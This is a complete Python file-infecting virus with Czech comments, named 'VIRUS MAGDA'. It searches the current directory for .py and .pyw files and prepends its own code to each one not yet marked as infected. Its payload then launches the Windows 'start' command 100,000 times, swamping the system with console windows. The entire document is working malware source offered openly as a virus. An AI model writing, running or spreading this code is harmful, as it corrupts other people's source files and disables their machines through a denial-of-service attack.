#VIRUS MAGDA
import sys
import glob

import os

Virus = []

script = open(sys.argv[0], "r")
lines = script.readlines()
script.close()

###Zde definujeme oblast viru -> začíná nadpisem VIRUS MAGDA končí SBOHEM###
Nakazeny = False
for line in lines:
    if line == "#VIRUS MAGDA":
        Nakazeny = True
    if not Nakazeny:
        Virus.append(line)
    if line == "# SBOHEM \n":
        break

###Zde hledám python soubory, které otevřeme, přečteme, zjistíme, zda je už soubor infikovaný (podle nadpisu VIRUS MAGDA)
###Pokud soubor není nakažený, tak do něj vložíme náš škodlivý kód
pythonSoubory = glob.glob('*.py') + glob.glob('*.pyw')
for file in pythonSoubory:
    script = open(file, "r")
    Kod = script.readlines()
    script.close()

    Nakazeny = False

    for line in Kod:
        if line == "#VIRUS MAGDA\n":
            Nakazeny = True
            break
            

    if not Nakazeny:
        NemocnyKod = []
        NemocnyKod.extend(Virus)
        NemocnyKod.extend('\n')
        NemocnyKod.extend(Kod)

        script = open(file, 'w')
        script.writelines(NemocnyKod)
        script.close()
###Zde je náš škodlivý kód
def ZlyKod():
    for a in range(100000):
        os.system('start')

ZlyKod()
#SBOHEM

